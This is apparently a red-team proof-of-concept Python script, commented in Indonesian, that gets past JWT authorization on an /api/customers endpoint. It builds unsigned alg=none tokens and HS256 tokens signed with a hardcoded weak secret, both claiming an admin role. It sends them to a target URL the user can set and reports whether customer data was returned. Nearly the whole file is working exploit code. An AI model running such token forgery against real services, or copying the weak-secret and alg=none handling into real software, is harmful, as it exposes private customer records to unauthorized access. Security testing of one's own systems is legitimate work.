#!/usr/bin/env python3
"""Bukti konsep (proof-of-concept) bypass JWT terhadap GET /api/customers.

Vektor 1 (--none)  : token dengan alg=none (TANPA tanda tangan), role=admin.
Vektor 2 (--hs256) : token HS256 di-forge memakai secret lemah, role=admin.

Meniru persis apa yang dilakukan tim Red Team di Burp Suite Repeater, tetapi
via skrip agar hasilnya bisa direproduksi & diverifikasi cepat.

Contoh pemakaian:
    python scripts/bypass_jwt.py --none
    python scripts/bypass_jwt.py --hs256
    python scripts/bypass_jwt.py --target http://<host-tailscale>
"""
import argparse
import base64
import hashlib
import hmac
import json
import urllib.error
import urllib.request

# Secret lemah (sama dengan nilai default di backend/app/config.py).
SECRET = "rahasia-super-lemah"

# Klaim palsu: role=admin (di database attacker tetap user biasa).
PAYLOAD = {
    "sub": 999,
    "username": "attacker",
    "role": "admin",
    "iat": 0,
    "exp": 4102444800,  # 2100-01-01 (token "none" tidak divalidasi exp-nya)
}


def b64url(data) -> str:
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_dec(seg: str) -> dict:
    return json.loads(base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4)))


def make_none_token() -> str:
    """JWT alg=none, format 3 segmen dengan signature kosong: header.payload."""
    header = {"alg": "none", "typ": "JWT"}
    h = b64url(json.dumps(header, separators=(",", ":")))
    p = b64url(json.dumps(PAYLOAD, separators=(",", ":")))
    return f"{h}.{p}."


def make_hs256_token() -> str:
    """JWT HS256 di-forge dengan secret yang diketahui."""
    header = {"alg": "HS256", "typ": "JWT"}
    h = b64url(json.dumps(header, separators=(",", ":")))
    p = b64url(json.dumps(PAYLOAD, separators=(",", ":")))
    signing = f"{h}.{p}"
    sig = hmac.new(SECRET.encode(), signing.encode(), hashlib.sha256).digest()
    return f"{signing}.{b64url(sig)}"


def get_customers(target: str, token: str):
    req = urllib.request.Request(
        f"{target}/api/customers",
        headers={"Authorization": f"Bearer {token}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode()


def main() -> None:
    parser = argparse.ArgumentParser(description="Demo bypass JWT /api/customers")
    parser.add_argument("--none", action="store_true", help="uji vektor alg=none")
    parser.add_argument("--hs256", action="store_true", help="uji vektor forge HS256")
    parser.add_argument("--target", default="http://localhost", help="base URL target")
    args = parser.parse_args()

    run_all = not (args.none or args.hs256)
    vectors = []
    if args.none or run_all:
        vectors.append(("alg=none", make_none_token()))
    if args.hs256 or run_all:
        vectors.append(("HS256 forge", make_hs256_token()))

    print(f"Target : {args.target}/api/customers")
    print(f"Payload: {json.dumps(PAYLOAD)}")
    print()

    for name, token in vectors:
        header = b64url_dec(token.split(".")[0])
        payload = b64url_dec(token.split(".")[1])
        status, body = get_customers(args.target, token)
        print(f"[{name}]")
        print(f"  header  : {header}")
        print(f"  payload : {payload}")
        print(f"  result  : HTTP {status}")
        if status == 200:
            print("  -> BYPASS BERHASIL: data customers terbaca tanpa jadi admin di DB")
        else:
            print(f"  -> body   : {body[:200]}")
        print()


if __name__ == "__main__":
    main()
